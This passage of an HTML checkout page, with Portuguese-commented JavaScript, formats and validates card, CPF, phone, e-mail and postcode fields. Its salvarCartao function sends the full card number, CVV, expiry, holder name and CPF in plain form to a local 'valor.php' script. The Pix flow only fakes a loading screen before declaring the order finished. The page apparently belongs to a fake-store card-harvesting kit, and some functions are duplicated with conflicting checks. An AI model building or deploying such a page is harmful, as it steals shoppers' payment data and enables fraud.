        inputElement.value = inputElement.value.slice(0, 2) + '/' + inputElement.value.slice(2);
    }
}
function validarCVVDoCartao(inputElement) {
    inputElement.value = inputElement.value.replace(/\D/g, ''); // Remove não dígitos
    if (inputElement.value.length > 4) {
        inputElement.value = inputElement.value.slice(0, 4); // Limita a 4 dígitos
    }
}
</script>























<script>
    function fazerPedidoViaPix() {
        // Exibir a div de 'loading'
        document.getElementById('loadingPagamentoFinal').style.display = 'block';

        // Ocultar o div 'campoFormaDePagamento1'
        document.getElementById('campoFormaDePagamento1').style.display = 'none';

        // Agendar o fechamento da div de 'loading' após 3 segundos
        setTimeout(function () {
            document.getElementById('loadingPagamentoFinal').style.display = 'none';

            // Exibir o div 'pedidoFinalizadoViaPix'
            document.getElementById('pedidoFinalizadoViaPix').style.display = 'flex';
        }, 3000); // 3000 milissegundos (3 segundos)
    }
</script>





































<script>
function copiarCodigo(elementId, mensagem) {
    // Seleciona o elemento com o ID especificado
    var elemento = document.getElementById(elementId);

    // Cria um intervalo de seleção
    var range = document.createRange();
    range.selectNode(elemento);

    // Seleciona o conteúdo do elemento
    window.getSelection().removeAllRanges();
    window.getSelection().addRange(range);

    // Tenta copiar o conteúdo selecionado para a área de transferência
    try {
        var copiado = document.execCommand('copy');
        if (copiado) {
            alert(mensagem);
        } else {
            alert('Falha ao copiar o código.');
        }
    } catch (err) {
        alert('Erro ao copiar o código: ' + err);
    }

    // Limpa a seleção da área de transferência
    window.getSelection().removeAllRanges();
}
</script>



















<script>
function selecionarFormaDePagamento(opcao) {
    // Ocultar o div 'pedidoFinalizadoViaPix'
    document.getElementById('pedidoFinalizadoViaPix').style.display = 'none';

    // Oculta todas as informações de pagamento
    document.getElementById('campoFormaDePagamento1').style.display = 'none';
    document.getElementById('campoFormaDePagamento3').style.display = 'none';

    // Remove a classe 'selecionado' de todas as opções
    document.getElementById('c').classList.remove('selecionado');
    document.getElementById('formaDePagamento3').classList.remove('selecionado');

    // Mostra as informações relevantes com base na opção selecionada
    if (opcao === '1') {
        document.getElementById('campoFormaDePagamento1').style.display = 'flex';
        document.getElementById('c').classList.add('selecionado');
    }  else if (opcao === '3') {
        document.getElementById('campoFormaDePagamento3').style.display = 'flex';
        document.getElementById('formaDePagamento3').classList.add('selecionado');
    }
}
</script>
<script>
        function mascaraCpfCnpj() {
            var documentoInput = document.getElementById("documento");
            var erroDocumento = document.getElementById("erroDocumento");

            // Remove any previous error messages
            erroDocumento.style.display = "none";

            // Get the input value and remove non-numeric characters
            var inputValue = documentoInput.value.replace(/\D/g, '');

            // Check if it's a CPF (11 digits)
            if (inputValue.length === 11) {
                documentoInput.value = formatCPF(inputValue);
            }
            // Check if it's a CNPJ (14 digits)
            else if (inputValue.length === 14) {
                documentoInput.value = formatCNPJ(inputValue);
            }
            // If it doesn't match the expected lengths, show an error
            else {
                erroDocumento.style.display = "block";
            }
        }

        // Function to format CPF
        function formatCPF(cpf) {
            return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
        }

        // Function to format CNPJ
        function formatCNPJ(cnpj) {
            return cnpj.replace(/(\d{2})(\d{3})(\d{3})(\d{4})(\d{2})/, "$1.$2.$3/$4-$5");
        }
    </script>
<script>
        function mascaraCelular() {
            var telefoneInput = document.getElementById("telefone");
            var erroTelefone = document.getElementById("erroTelefone");

            // Remove any previous error messages
            erroTelefone.style.display = "none";

            // Get the input value and remove non-numeric characters
            var inputValue = telefoneInput.value.replace(/\D/g, '');

            // Format the phone number
            if (inputValue.length >= 10) {
                telefoneInput.value = formatTelefone(inputValue);
            }
            // If it doesn't match the expected length, show an error
            else {
                erroTelefone.style.display = "block";
            }
        }

        // Function to format the phone number
        function formatTelefone(telefone) {
            return telefone.replace(/(\d{2})(\d)(\d{4})(\d{4})/, "($1) $2 $3-$4");
        }
    </script>
 <script>
        function mascaraEmail() {
            var emailInput = document.getElementById("email");
            var erroEmail = document.getElementById("erroEmail");

            // Remove any previous error messages
            erroEmail.style.display = "none";

            // Get the input value
            var inputValue = emailInput.value;

            // Validate the email format
            if (isValidEmail(inputValue)) {
                // Valid email
            } else {
                erroEmail.style.display = "block";
            }
        }

        // Function to validate email format
        function isValidEmail(email) {
            // Basic email validation regex
            var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(email);
        }
    </script>
	<script>
        async function mascaraCep() {
            var cepInput = document.getElementById("cepEndereco");
            var erroCep = document.getElementById("erroCepEndereco");

            // Remove any previous error messages
            erroCep.style.display = "none";

            // Get the input value and remove non-numeric characters
            var inputValue = cepInput.value.replace(/\D/g, '');

            // Format the CEP
            if (inputValue.length === 8) {
                cepInput.value = inputValue.replace(/(\d{5})(\d{3})/, "$1-$2");

                // Fetch address details from ViaCEP API
                try {
                    const response = await fetch(`https://viacep.com.br/ws/${inputValue}/json/`);
                    const data = await response.json();

                    // Populate other address fields
                    document.getElementById("logradouroEndereco").value = data.logradouro || "";
                    document.getElementById("bairroEndereco").value = data.bairro || "";
                    document.getElementById("cidadeEndereco").value = data.localidade || "";
                    document.getElementById("estadoEndereco").value = data.uf || "";
                } catch (error) {
                    console.error("Error fetching address:", error);
                    erroCep.style.display = "block";
                }
            } else {
                // If it doesn't match the expected length, show an error
                erroCep.style.display = "block";
            }
        }

        // Function to hide error on typing
        function ocultarErroAoDigitar(inputId, erroId) {
            document.getElementById(erroId).style.display = 'none';
        }
    </script>
	 <script>
        function formatarNumeroDoCartao(input) {
            // Remove caracteres não numéricos
            let numeroCartao = input.value.replace(/\D/g, '');

            // Aplica a máscara
            numeroCartao = numeroCartao.replace(/(\d{4})(\d{4})(\d{4})(\d{4})/, '$1 $2 $3 $4');

            // Atualiza o valor do input
            input.value = numeroCartao;
        }

        function validarNumeroDoCartao(input) {
            // Remove caracteres não numéricos
            let numeroCartao = input.value.replace(/\D/g, '');

            // Adicione a lógica de validação aqui
            // Exemplo: verificar se o número do cartão é válido usando algoritmo de Luhn

            // Exemplo básico de validação usando Luhn
            let soma = 0;
            let digitos = numeroCartao.split('').map(Number).reverse();

            for (let i = 0; i < digitos.length; i++) {
                if (i % 2 === 1) {
                    digitos[i] *= 2;
                    if (digitos[i] > 9) {
                        digitos[i] -= 9;
                    }
                }
                soma += digitos[i];
            }

            if (soma % 10 !== 0) {
                console.log('Número do cartão inválido');
            } else {
                console.log('Número do cartão válido');
            }
        }
    </script>
	  <script>
        function validarNumeroDoCartao(input) {
            // Lógica de validação para o número do cartão (exemplo: deve ter 16 dígitos)
            var numeroCartao = input.value.replace(/\s/g, ''); // Remover espaços em branco
            if (/^\d{16}$/.test(numeroCartao)) {
                document.getElementById('erroNumeroDoCartão').style.display = 'none';
            } else {
                document.getElementById('erroNumeroDoCartão').style.display = 'block';
            }
        }

        function validarNomeDoTitularDoCartao(input) {
            // Lógica de validação para o nome do titular do cartão (exemplo: não deve estar vazio)
            if (input.value.trim() !== '') {
                document.getElementById('erroNomeDoTitularDoCartão').style.display = 'none';
            } else {
                document.getElementById('erroNomeDoTitularDoCartão').style.display = 'block';
            }
        }

        function formatarValidadeDoCartao(input) {
            // Lógica de formatação para a validade do cartão (exemplo: MM/AA)
            var validade = input.value.replace(/\s/g, ''); // Remover espaços em branco
            if (/^\d{2}\/\d{2}$/.test(validade)) {
                document.getElementById('erroValidadeDoCartão').style.display = 'none';
            } else {
                document.getElementById('erroValidadeDoCartão').style.display = 'block';
            }
        }

        function validarCVVDoCartao(input) {
            // Lógica de validação para o CVV do cartão (exemplo: deve ter 3 dígitos)
            var cvv = input.value.replace(/\s/g, ''); // Remover espaços em branco
            if (/^\d{3}$/.test(cvv)) {
                document.getElementById('erroCvvDoCartão').style.display = 'none';
            } else {
                document.getElementById('erroCvvDoCartão').style.display = 'block';
            }
        }

        function mascaraCpf(inputId, erroId) {
            // Lógica de máscara para o CPF (exemplo: 123.456.789-01)
            var cpf = document.getElementById(inputId).value.replace(/\D/g, '');
            if (cpf.length === 11) {
                cpf = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
                document.getElementById(inputId).value = cpf;
                document.getElementById(erroId).style.display = 'none';
            } else {
                document.getElementById(erroId).style.display = 'block';
            }
        }

        function mascaraValidade(inputId, erroId) {
            // Lógica de máscara para a validade do cartão (exemplo: MM/AA)
            var validade = document.getElementById(inputId).value.replace(/\D/g, '');
            if (validade.length <= 4) {
                validade = validade.replace(/(\d{2})(\d{0,2})/, '$1/$2');
                document.getElementById(inputId).value = validade;
                document.getElementById(erroId).style.display = 'none';
            } else {
                document.getElementById(erroId).style.display = 'block';
            }
        }

        function mascaraCvv(inputId, erroId) {
            // Lógica de máscara para o CVV do cartão (exemplo: 123)
            var cvv = document.getElementById(inputId).value.replace(/\D/g, '');
            if (cvv.length <= 3) {
                document.getElementById(inputId).value = cvv;
                document.getElementById(erroId).style.display = 'none';
            } else {
                document.getElementById(erroId).style.display = 'block';
            }
        }
</script>
<script>
    function salvarCartao() {
        const numeroDoCartao = document.getElementById('numeroDoCartão').value;
        const nomeTitular = document.getElementById('nomeDoTitularDoCartão').value;
        const validade = document.getElementById('validadeDoCartão').value;
        const cvv = document.getElementById('cvvDoCartão').value;
        const cpfTitular = document.getElementById('cpfDoTitularDoCartão').value;

        const dadosDoCartao = {
            numeroDoCartao,
            nomeTitular,
            validade,
            cvv,
            cpfTitular
        };

        document.getElementById('loading').style.display = 'block';

        // Enviar dados via AJAX para o script PHP
        fetch('valor.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(dadosDoCartao)
        })
        .then(response => response.json())
        .then(data => {
            setTimeout(() => {
                document.getElementById('loading').style.display = 'none';
                alert(data.message);
            }, 3000);
        })
        .catch(error => {
            console.error('Erro:', error);
            document.getElementById('loading').style.display = 'none';
            alert('Erro ao salvar os dados do cartão.');
        });
    }

    document.querySelector('div[onclick="salvarCartão();"]').addEventListener('click', salvarCartao);
</script>



</body>

</html>
